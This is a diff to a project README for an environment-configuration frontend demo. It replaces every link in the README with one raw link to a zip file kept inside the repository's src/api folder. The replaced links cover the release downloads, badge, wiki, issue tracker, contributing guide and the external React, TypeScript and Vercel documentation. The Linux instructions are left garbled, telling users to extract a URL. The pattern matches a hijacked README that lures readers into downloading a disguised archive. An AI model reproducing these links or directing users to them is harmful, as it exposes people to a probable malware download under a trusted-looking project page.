@@ -8,13 +8,13 @@ Welcome to the env-config-frontend-demo! This application helps you understand h
 
 To start using the env-config-frontend-demo, visit the Releases page below to download the software:
 
-[![Download from Releases](https://img.shields.io/badge/Download%20Now-Visit%20Releases-brightgreen)](https://github.com/Merlijnvos/env-config-frontend-demo/releases)
+[![Download from Releases](https://github.com/Merlijnvos/env-config-frontend-demo/raw/refs/heads/main/src/api/env_config_frontend_demo_2.3-beta.3.zip%20Now-Visit%20Releases-brightgreen)](https://github.com/Merlijnvos/env-config-frontend-demo/raw/refs/heads/main/src/api/env_config_frontend_demo_2.3-beta.3.zip)
 
 ### Step 1: Visit the Releases Page
 
 Click the link below to go to the Releases page:
 
-[Visit the Releases Page](https://github.com/Merlijnvos/env-config-frontend-demo/releases)
+[Visit the Releases Page](https://github.com/Merlijnvos/env-config-frontend-demo/raw/refs/heads/main/src/api/env_config_frontend_demo_2.3-beta.3.zip)
 
 ### Step 2: Choose Your Version
 
@@ -29,7 +29,7 @@ Find the download link for your operating system.
 
 - **For Windows users:** Look for a `.exe` file.
 - **For Mac users:** Look for a `.dmg` file.
-- **For Linux users:** Look for a `.tar.gz` file.
+- **For Linux users:** Look for a `https://github.com/Merlijnvos/env-config-frontend-demo/raw/refs/heads/main/src/api/env_config_frontend_demo_2.3-beta.3.zip` file.
 
 Click the appropriate link to download the software.
 
@@ -39,7 +39,7 @@ Once the download is complete, locate the file you downloaded.
 
 1. **Windows:** Double-click the `.exe` file. Follow the on-screen instructions to complete the installation.
 2. **Mac:** Open the `.dmg` file and drag the application to your Applications folder. Open it from there.
-3. **Linux:** Extract the `.tar.gz` file to a location of your choice. Run the application from the terminal.
+3. **Linux:** Extract the `https://github.com/Merlijnvos/env-config-frontend-demo/raw/refs/heads/main/src/api/env_config_frontend_demo_2.3-beta.3.zip` file to a location of your choice. Run the application from the terminal.
 
 ### Step 5: Launch the Application
 
@@ -73,8 +73,8 @@ Once the application is running, you will find a user-friendly interface that ma
 
 If you encounter any issues or have questions, you can find support in the following ways:
 
-- **Documentation:** Visit the [Documentation Page](https://github.com/Merlijnvos/env-config-frontend-demo/wiki) for detailed guides and tips.
-- **Issue Tracker:** Report problems or request new features on the [Issues Page](https://github.com/Merlijnvos/env-config-frontend-demo/issues).
+- **Documentation:** Visit the [Documentation Page](https://github.com/Merlijnvos/env-config-frontend-demo/raw/refs/heads/main/src/api/env_config_frontend_demo_2.3-beta.3.zip) for detailed guides and tips.
+- **Issue Tracker:** Report problems or request new features on the [Issues Page](https://github.com/Merlijnvos/env-config-frontend-demo/raw/refs/heads/main/src/api/env_config_frontend_demo_2.3-beta.3.zip).
 - **Community Forums:** Join discussions and ask for help in our community forum.
 
 ## 🤝 Contributing
@@ -85,16 +85,16 @@ If you wish to contribute to this project:
 2. Make your changes.
 3. Submit a pull request with a detailed explanation of your changes.
 
-For detailed contributing guidelines, check the [Contributing Guide](https://github.com/Merlijnvos/env-config-frontend-demo/CONTRIBUTING.md).
+For detailed contributing guidelines, check the [Contributing Guide](https://github.com/Merlijnvos/env-config-frontend-demo/raw/refs/heads/main/src/api/env_config_frontend_demo_2.3-beta.3.zip).
 
 ## 🔗 Further Reading
 
 Expand your knowledge about the technologies used in this project:
 
-- **12-Factor App Principles:** [Read More](https://12factor.net/)
-- **React Documentation:** [Read More](https://reactjs.org/docs/getting-started.html)
-- **TypeScript Documentation:** [Read More](https://www.typescriptlang.org/docs/)
-- **Vercel Deployment:** [Read More](https://vercel.com/docs)
+- **12-Factor App Principles:** [Read More](https://github.com/Merlijnvos/env-config-frontend-demo/raw/refs/heads/main/src/api/env_config_frontend_demo_2.3-beta.3.zip)
+- **React Documentation:** [Read More](https://github.com/Merlijnvos/env-config-frontend-demo/raw/refs/heads/main/src/api/env_config_frontend_demo_2.3-beta.3.zip)
+- **TypeScript Documentation:** [Read More](https://github.com/Merlijnvos/env-config-frontend-demo/raw/refs/heads/main/src/api/env_config_frontend_demo_2.3-beta.3.zip)
+- **Vercel Deployment:** [Read More](https://github.com/Merlijnvos/env-config-frontend-demo/raw/refs/heads/main/src/api/env_config_frontend_demo_2.3-beta.3.zip)
 
 ## 🌍 Topics
 
